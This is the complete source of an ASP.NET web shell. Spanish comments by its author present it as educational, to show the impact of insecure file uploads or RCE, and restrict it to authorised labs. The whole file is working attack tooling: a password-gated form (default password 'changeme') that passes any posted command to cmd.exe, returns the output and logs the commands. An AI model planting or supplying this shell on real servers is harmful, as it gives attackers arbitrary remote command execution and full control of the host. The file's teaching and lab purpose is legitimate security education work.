<%@ Page Language="C#" Debug="false" %>
<%
/*
------------------------------------------------------------
 Script: aspx_webshell.aspx
 Autor: Raul Renales
 Formación y cursos: https://raulrenales.es

 Descripción:
   Webshell ASPX educativa para demostrar el impacto de
   una subida de archivos insegura o RCE en aplicaciones ASP.NET.

 Uso:
   Exclusivamente educativo y en entornos autorizados.
------------------------------------------------------------
*/

string PASSWORD = "changeme";   // Cambiar SIEMPRE en laboratorio
string LOG_FILE = "cmd.log";

// -------------------------
// Autenticación básica
// -------------------------
if (Request.Form["password"] == null || Request.Form["password"] != PASSWORD)
{
    Response.StatusCode = 403;
    Response.Write("Access denied");
    Response.End();
}

// -------------------------
// Ejecución de comandos
// -------------------------
if (Request.Form["cmd"] != null)
{
    string cmd = Request.Form["cmd"];

    try
    {
        // Log de comandos (docente / DFIR)
        System.IO.File.AppendAllText(
            Server.MapPath(LOG_FILE),
            DateTime.Now.ToString("[yyyy-MM-dd HH:mm:ss] ") + cmd + "\n"
        );

        System.Diagnostics.Process p = new System.Diagnostics.Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + cmd;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.UseShellExecute = false;
        p.Start();

        string output = p.StandardOutput.ReadToEnd();
        p.WaitForExit();

        Response.Write("<pre>" + Server.HtmlEncode(output) + "</pre>");
    }
    catch (Exception ex)
    {
        Response.Write("Error: " + Server.HtmlEncode(ex.Message));
    }

    Response.End();
}
%>

<!DOCTYPE html>
<html>
<head>
    <title>ASPX WebShell</title>
</head>
<body>
    <h3>ASPX WebShell (Lab)</h3>
    <form method="post">
        <input type="password" name="password" placeholder="Password" required /><br /><br />
        <input type="text" name="cmd" placeholder="Command" size="60" autofocus /><br /><br />
        <input type="submit" value="Execute" />
    </form>
</body>
</html>
